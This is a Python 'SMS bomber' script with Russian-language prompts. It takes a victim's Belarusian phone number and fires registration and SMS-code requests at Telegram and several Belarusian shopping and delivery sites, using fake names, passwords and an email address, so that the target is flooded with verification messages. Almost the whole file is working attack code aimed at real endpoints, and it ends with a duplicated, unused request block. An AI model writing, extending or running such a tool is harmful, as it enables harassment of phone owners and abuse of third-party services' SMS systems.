import os, sys
#import fake_useragent
import requests
#import time

user = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0'
headers1 = {'user_agent': user}
print('Введите номер в формате: +375*********')
phone = input()

dates = {
	"phone": "+" + phone
}


response = requests.post('https://my.telegram.org/auth/send_password', data=dates, headers=headers1)
if response.status_code == 200:
    print("Смс от telegram отправлено!")
else:
    print("Смс от telegram не отправлено!")

dates = {
    "CSRF":	"",
	"ACTION":	"REGISTER",
	"MODE":	"PHONE",
	"PHONE": phone,
	"PASSWORD": "123321123У",
	"PASSWORD2": "123321123У"
}

response = requests.post('https://sushihouse.by/?action=auth', data=dates, headers=headers1)

if response.status_code == 200:
    print("Смс от sushihouse отправлено!")
else:
    print("Смс от sushihouse не отправлено!")


dates = {
	"PROPERTY[NAME]": "Виктор",
    "PROPERTY[PHONE]": f"{phone}"
}

response = requests.post('https://delivio.by/be/api/register', json={"phone": f"{phone}"}, headers=headers1)
if response.status_code == 201:
    print("Смс от delivio отправлено!")
else:
    print("Смс от delivio не отправлено!")

dates = {
	"_token": "YhD2mlzKocENXnqmSbhNidVuVElRpX2wAifKrbdB",
	"step":	"1",
	"phone": f"{phone}",
	"smsCode": "",
	"email": "",
	"password":	""
}

sess = requests.Session()

response = requests.post('https://api.static.edostavka.by/rest/Json', json={"CRC":"","Packet":{"JWT":"null","MethodName":"DiscountClub.PutManDiscountShort","ServiceNumber":"01093ABC-6B36-450D-8FAF-EA32BCC2EAE8","Data":{"SourceName":"edostavka.by","LoginNameTypeId":2,"TargetId":"30,31,32","MobileOperatorId":"-1","Family":"-1","WhatSex":"-1","Phone2":"","Address1Name":"","Porch":"","Floorx":"","Address2Name":"","DateOfBirth":"","EMail":"proverkasite238@gmail.com","Phone1":f"{phone[1:]}","Name2":"Иван","Name1":"Иванович","Name3":"Иванов","Password":"123321123Egor","passwordRepeat":"123321123Egor","isVisiblePassword":"false"}}}, headers=headers1)

if response.status_code == 201 or response.status_code == 200:
    print("Смс от edostavka отправлено!")
else:
    print("Смс от edostavka не отправлено!")
    
    

dates = {
	"bxajaxid": "ajax",
	"auth_action": "send_code_sms",
	"PHONE": f"{phone}"
}

sess = requests.Session()

response = requests.post('https://gippo-market.by/local/components/slam/smart.auth/ajax.php', data=dates, headers=headers1)

if response.status_code == 200:
    print('Смс от gippo-market отправлено!')
else:
    print('Смс от gippo-market не отправлено!')
    

dates = {
	"bxajaxid": "ajax",
	"auth_action": "send_code_sms",
	"PHONE": f"{phone}"
}
